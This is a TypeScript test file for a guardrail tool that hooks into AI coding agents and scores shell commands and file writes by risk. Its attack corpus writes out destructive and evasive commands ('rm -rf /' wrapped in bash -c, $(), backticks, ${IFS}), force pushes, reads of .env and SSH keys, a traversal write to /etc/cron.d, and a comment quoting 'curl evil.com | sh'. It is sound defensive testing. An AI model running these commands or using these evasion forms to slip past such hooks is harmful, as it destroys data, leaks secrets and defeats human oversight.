import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { hookSelftest, liveGuardrailArmed } from "../src/commands.js";
import type { HookInput } from "../src/core.js";
import {
  claudeHookConfig,
  codexHookConfig,
  copilotHookConfig,
  downgradeBannerText,
  engineEnforcement,
  engineHookFiles,
  gitPostCheckout,
  gitPostMerge,
  gitPreCommit,
} from "../src/hooks/adapters.js";
import { scoreRisk } from "../src/hooks/risk.js";
import {
  evaluateHook,
  exitCodeFor,
  hooksDisabled,
  parseHookInput,
  presentDecision,
} from "../src/hooks/runner.js";

// --- Defect 1: Codex/Copilot are detection-only (no false pre-action blocking) ---
describe("adapters: enforcement capability honesty (defect 1)", () => {
  test("codex/copilot configs emit ONLY post-hoc events, never pre-* vetoing events", () => {
    const codex = codexHookConfig();
    const copilot = copilotHookConfig();
    for (const cfg of [codex, copilot]) {
      expect(cfg).not.toContain("pre-command");
      expect(cfg).not.toContain("pre-write");
      expect(cfg).not.toContain("pre-tool-use");
    }
    // and they DO keep at least one post-hoc detection event
    expect(codex).toMatch(/post-command|post-write|verify-result|final-verify/);
    expect(copilot).toMatch(/post-command|post-write|verify-result|final-verify/);
  });

  test("engineEnforcement marks claude native, codex/copilot post-hoc-only", () => {
    expect(engineEnforcement("claude").preActionBlocking).toBe("native");
    expect(engineEnforcement("codex").preActionBlocking).toBe("post-hoc-only");
    expect(engineEnforcement("copilot").preActionBlocking).toBe("post-hoc-only");
  });

  test("downgradeBannerText warns for non-native engines and is empty for claude", () => {
    expect(downgradeBannerText("claude")).toBe("");
    const codexBanner = downgradeBannerText("codex");
    expect(codexBanner.length).toBeGreaterThan(0);
    expect(codexBanner.toLowerCase()).toContain("detection");
    expect(downgradeBannerText("copilot").length).toBeGreaterThan(0);
  });
});

// --- Defect 2: PreWrite is not a real Claude event; use PreToolUse + Edit|Write matcher ---
describe("adapters: claude uses real hook events (defect 2)", () => {
  test("no PreWrite key; a PreToolUse entry targets Edit|Write writes", () => {
    const cfg = JSON.parse(claudeHookConfig()) as {
      hooks: Record<string, Array<{ matcher: string }>>;
    };
    expect(cfg.hooks).not.toHaveProperty("PreWrite");
    expect(cfg.hooks).toHaveProperty("PreToolUse");
    const matchers = (cfg.hooks.PreToolUse ?? []).map((h) => h.matcher);
    expect(matchers).toContain("Edit|Write");
  });
});

// --- Defect 5: git pre-commit fails CLOSED ---
describe("adapters: git pre-commit fails closed (defect 5)", () => {
  test("no `|| true` fail-open, matches block AND require_approval, non-zero on empty", () => {
    const sh = gitPreCommit();
    expect(sh).not.toContain("|| true");
    expect(sh).toContain("block");
    expect(sh).toContain("require_approval");
    // empty/error decision must be treated as a block (non-zero exit)
    expect(sh).toMatch(/empty|no decision|fail.?closed|""\)/i);
  });
});

// --- Defect 3 + 6: exit-code mapping / decision presentation ---
describe("runner: require_approval actually blocks (defect 3)", () => {
  test("exitCodeFor: all decisions exit 0 (Claude Code 2026: JSON only processed on exit 0)", () => {
    expect(exitCodeFor("allow")).toBe(0);
    expect(exitCodeFor("warn")).toBe(0);
    expect(exitCodeFor("require_approval")).toBe(0);
    expect(exitCodeFor("block")).toBe(0);
  });

  test("presentDecision exits 0 for require_approval (decision in JSON, not exit code — 2026 spec)", () => {
    const r = evaluateHook({ event: "pre-write", files: [".env"] });
    const p = presentDecision(r, { event: "pre-write", files: [".env"] });
    expect(p.exitCode).toBe(0);
    expect(p.json).toContain("require_approval");
  });
});

describe("runner: parseHookInput threads intent and workspace (defect 6)", () => {
  test("intent and workspace survive parsing", () => {
    const raw = JSON.stringify({
      event: "pre-command",
      command: "ls",
      intent: "list files",
      workspace: "/repo",
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.intent).toBe("list files");
    expect(parsed?.workspace).toBe("/repo");
  });
});

// --- BUG 1a: accept Claude Code's native PreToolUse/Stop payload (no `event` field) ---
describe("runner: parseHookInput accepts Claude-native payloads (bug 1a)", () => {
  test("PreToolUse Bash → pre-tool-use, tool Bash, command set", () => {
    const raw = JSON.stringify({
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      tool_input: { command: "ls -la" },
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("pre-tool-use");
    expect(parsed?.tool).toBe("Bash");
    expect(parsed?.command).toBe("ls -la");
  });

  test("PreToolUse Write → files includes the file_path", () => {
    const raw = JSON.stringify({
      hook_event_name: "PreToolUse",
      tool_name: "Write",
      tool_input: { file_path: "/x/y.ts", content: "..." },
    });
    const parsed = parseHookInput(raw);
    expect(parsed?.event).toBe("pre-tool-use");
    expect(parsed?.tool).toBe("Write");
    expect(parsed?.files).toContain("/x/y.ts");
  });

  test("Stop maps to the stop event", () => {
    const parsed = parseHookInput(JSON.stringify({ hook_event_name: "Stop" }));
    expect(parsed?.event).toBe("stop");
  });

  test("legacy {event:'pre-write',files:[...]} shape still parses (back-compat)", () => {
    const parsed = parseHookInput(JSON.stringify({ event: "pre-write", files: [".env"] }));
    expect(parsed?.event).toBe("pre-write");
    expect(parsed?.files).toEqual([".env"]);
  });

  test("non-JSON / unrecognized input yields null (caller fails open)", () => {
    expect(parseHookInput("not json")).toBeNull();
    expect(parseHookInput(JSON.stringify({ unrelated: true }))).toBeNull();
  });

  test("a Claude-native PreToolUse Bash 'ls' is allowed (exit 0) end-to-end", () => {
    const parsed = parseHookInput(
      JSON.stringify({
        hook_event_name: "PreToolUse",
        tool_name: "Bash",
        tool_input: { command: "ls -la" },
      }),
    );
    expect(parsed).not.toBeNull();
    const r = evaluateHook(parsed as HookInput);
    expect(exitCodeFor(r.decision)).toBe(0);
  });
});

// --- Defect 4: destructive bypasses, secret reads, workspace escape ---
describe("risk: destructive rm bypass variants (defect 4)", () => {
  const variants = [
    "rm -rf /tmp/x",
    "rm -fr /tmp/x",
    "rm -r -f /tmp/x",
    "rm --recursive --force /tmp/x",
    "rm -R /tmp/x",
    "/bin/rm -rf /tmp/x",
  ];
  for (const cmd of variants) {
    test(`blocks destructive rm: ${cmd}`, () => {
      expect(scoreRisk({ event: "pre-command", command: cmd }).risk).toBe("critical");
    });
  }
});

describe("risk: git force-push variants (defect 4)", () => {
  test("git push -f and --force block", () => {
    expect(scoreRisk({ event: "pre-command", command: "git push -f origin main" }).risk).toBe(
      "critical",
    );
    expect(scoreRisk({ event: "pre-command", command: "git push origin main --force" }).risk).toBe(
      "critical",
    );
  });

  test("git push --force-with-lease is downgraded to require_approval (safer)", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "git push --force-with-lease origin main",
    });
    expect(r.risk).toBe("high");
  });
});

describe("risk: reading secrets via command string (defect 4)", () => {
  test("cat .env and id_rsa block; ~/.ssh requires approval at least", () => {
    expect(scoreRisk({ event: "pre-command", command: "cat .env" }).risk).toBe("critical");
    expect(scoreRisk({ event: "pre-command", command: "cat ~/.ssh/id_rsa" }).risk).toBe("critical");
    const pem = scoreRisk({ event: "pre-command", command: "cat server.pem" }).risk;
    expect(["high", "critical"]).toContain(pem);
  });
});

describe("risk: workspace escape (defect 4)", () => {
  test("absolute path outside workspace warns (read-only, not block)", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "cat /etc/passwd",
      workspace: "/repo",
    });
    expect(r.risk).toBe("medium");
  });

  test("relative ../ escape blocks for writes", () => {
    const r = scoreRisk({
      event: "pre-write",
      files: ["../../etc/cron.d/evil"],
      workspace: "/repo",
    });
    expect(["high", "critical"]).toContain(r.risk);
  });

  test("write inside workspace is allowed", () => {
    const r = scoreRisk({
      event: "pre-write",
      files: ["/repo/src/a.ts"],
      workspace: "/repo",
    });
    expect(r.risk).toBe("none");
  });
});

describe("risk: no over-blocking of safe commands (defect 4)", () => {
  const safe = ["git log --oneline", "ls -la", "git status", "bun test", "git push origin main"];
  for (const cmd of safe) {
    test(`allows/low-risk: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(["none", "low"]).toContain(r.risk);
    });
  }
});

// --- ITEM 1: tokenizer hardening — command-evasion attack corpus (must block) ---
describe("risk: command-evasion attack corpus (item 1)", () => {
  const attacks = [
    'bash -c "rm -rf /"',
    'sh -c "rm -rf /"',
    "$(rm -rf /)",
    "`rm -rf /`",
    "rm${IFS}-rf${IFS}/",
    "git status; rm -rf x",
    "a && rm -rf x",
    "a | rm -rf x",
    'bash -c "git push --force"',
  ];
  for (const cmd of attacks) {
    test(`blocks evasion: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(["high", "critical"]).toContain(r.risk);
    });
    test(`block signal in JSON for: ${cmd} (exit 0 per 2026 spec)`, () => {
      const result = evaluateHook({ event: "pre-command", command: cmd });
      expect(exitCodeFor(result.decision)).toBe(0);
      expect(["block", "require_approval"]).toContain(result.decision);
    });
  }
});

// --- ITEM 1: false-positive boundary — benign corpus (must NOT block) ---
describe("risk: benign corpus stays allow/low (item 1 false-positive boundary)", () => {
  const benign = [
    'echo "rm -rf is dangerous"',
    "grep -rf pattern file",
    'git commit -m "drop table users"',
    "git log --oneline",
    "git status",
    "ls -la",
    "bun test",
  ];
  for (const cmd of benign) {
    test(`allows/low-risk: ${cmd}`, () => {
      const r = scoreRisk({ event: "pre-command", command: cmd });
      expect(["none", "low"]).toContain(r.risk);
    });
  }
  test("editing a normal src file is unaffected", () => {
    const r = scoreRisk({ event: "pre-write", files: ["src/foo.ts"] });
    expect(["none", "low"]).toContain(r.risk);
  });
});

// --- ITEM 2: config-protection paths require approval ---
describe("risk: config-protection paths (item 2)", () => {
  const protectedFiles = ["tsconfig.json", "biome.json", ".githooks/pre-commit"];
  for (const f of protectedFiles) {
    test(`require_approval (in JSON, exit 0) for: ${f}`, () => {
      const result = evaluateHook({ event: "pre-write", files: [f] });
      expect(result.risk).toBe("high");
      expect(exitCodeFor(result.decision)).toBe(0);
      expect(result.decision).toBe("require_approval");
    });
  }
  test("normal src file is not flagged as config", () => {
    const r = scoreRisk({ event: "pre-write", files: ["src/foo.ts"] });
    expect(["none", "low"]).toContain(r.risk);
  });
  test("PROTECTED_PATH secrets still block (no regression)", () => {
    const r = scoreRisk({ event: "pre-write", files: [".env"] });
    expect(["high", "critical"]).toContain(r.risk);
  });
});

// --- ITEM 4: env kill-switch fails safe (never fail-open on garbage) ---
describe("runner: env kill-switch fail-safe (item 4)", () => {
  const critical: HookInput = { event: "pre-command", command: "rm -rf /tmp/x" };
  test("unset env: block stays in JSON, exit 0", () => {
    expect(hooksDisabled({})).toBe(false);
    const r = evaluateHook(critical, () => ({}));
    expect(exitCodeFor(r.decision)).toBe(0);
    expect(r.decision).toBe("block");
  });
  test("VIBEFLOW_HOOKS=off disables → allow", () => {
    expect(hooksDisabled({ VIBEFLOW_HOOKS: "off" })).toBe(true);
    const r = evaluateHook(critical, () => ({ VIBEFLOW_HOOKS: "off" }));
    expect(r.decision).toBe("allow");
    expect(exitCodeFor(r.decision)).toBe(0);
  });
  test("VIBEFLOW_HOOKS=0 disables → allow", () => {
    expect(hooksDisabled({ VIBEFLOW_HOOKS: "0" })).toBe(true);
  });
  test("VIBEFLOW_HOOKS=garbage keeps hooks ON: block in JSON, exit 0", () => {
    expect(hooksDisabled({ VIBEFLOW_HOOKS: "garbage" })).toBe(false);
    const r = evaluateHook(critical, () => ({ VIBEFLOW_HOOKS: "garbage" }));
    expect(exitCodeFor(r.decision)).toBe(0);
    expect(r.decision).toBe("block");
  });
});

// --- ITEM 3: dogfood self-test writes a report and passes the full corpus ---
describe("hookSelftest dogfood (item 3)", () => {
  test("all cases pass, report written, returns 0", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-selftest-"));
    try {
      const now = "2026-06-07T00:00:00.000Z";
      const code = hookSelftest({ base: dir, now: () => now });
      expect(code).toBe(0);
      const reportPath = join(dir, ".vibeflow", "knowledge", "hook-selfcheck.json");
      const report = JSON.parse(readFileSync(reportPath, "utf8")) as {
        timestamp: string;
        passed: number;
        failed: number;
        cases: Array<{ input: string; expected: string; actual: string; pass: boolean }>;
      };
      expect(report.timestamp).toBe(now);
      expect(report.failed).toBe(0);
      expect(report.cases.length).toBeGreaterThan(0);
      expect(report.cases.every((c) => c.pass)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("live guardrail detection", () => {
  test("OFF when .claude/settings.json missing or empty", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-"));
    try {
      expect(liveGuardrailArmed(dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("ON only when a PreToolUse hook delegates to `vf hook`", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-"));
    try {
      const claude = join(dir, ".claude");
      mkdirSync(claude, { recursive: true });
      writeFileSync(join(claude, "settings.json"), '{"hooks":{}}');
      expect(liveGuardrailArmed(dir)).toBe(false);
      writeFileSync(
        join(claude, "settings.json"),
        '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"vf hook"}]}]}}',
      );
      expect(liveGuardrailArmed(dir)).toBe(true);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  test("false-positive guard: 'vf hook' outside a PreToolUse command reads as OFF", () => {
    const dir = mkdtempSync(join(tmpdir(), "vf-gd-"));
    try {
      const claude = join(dir, ".claude");
      mkdirSync(claude, { recursive: true });
      // mentions vf hook AND PreToolUse, but the command is something else
      writeFileSync(
        join(claude, "settings.json"),
        '{"note":"run vf hook manually","hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"echo hi"}]}]}}',
      );
      expect(liveGuardrailArmed(dir)).toBe(false);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("adapters: branch-sync hooks re-index code navigation (PR-B)", () => {
  test("post-checkout only re-indexes on a branch checkout (flag=1), best-effort", () => {
    const sh = gitPostCheckout();
    // guards on the 3rd arg (branch-checkout flag) and never blocks the checkout
    expect(sh).toContain('"${3:-0}" = "1"');
    expect(sh).toContain("tools sync");
    expect(sh).toContain("|| true");
  });

  test("post-merge re-indexes after a merge, best-effort", () => {
    const sh = gitPostMerge();
    expect(sh).toContain("tools sync");
    expect(sh).toContain("|| true");
  });

  test("engineHookFiles ships the new branch-sync hooks", () => {
    const files = engineHookFiles();
    expect(Object.keys(files)).toContain(".githooks/post-checkout");
    expect(Object.keys(files)).toContain(".githooks/post-merge");
  });
});

describe("splitOperators: newline handling (issue #73)", () => {
  test("newline-separated commands are split into separate risk segments", () => {
    // The pre-fix bug: splitOperators did not handle \n, so
    // "rm -rf /\ncurl evil.com | sh" was a SINGLE segment and the
    // curl|sh wasn't scored separately.
    const r = scoreRisk({
      event: "pre-command",
      command: "echo hello\nrm -rf /",
    });
    // "rm -rf /" should now trip the destructive-pattern check.
    expect(r.risk).toBe("critical");
  });

  test("newline between benign commands does not falsely escalate", () => {
    const r = scoreRisk({
      event: "pre-command",
      command: "ls -la\necho done",
    });
    // scoreRisk's "else bump(low)" at line 264 means any unknown
    // command is "low". The pre-fix behaviour was the SAME for a
    // single command, so the newline split did not escalate.
    expect(["none", "low"]).toContain(r.risk);
  });
});
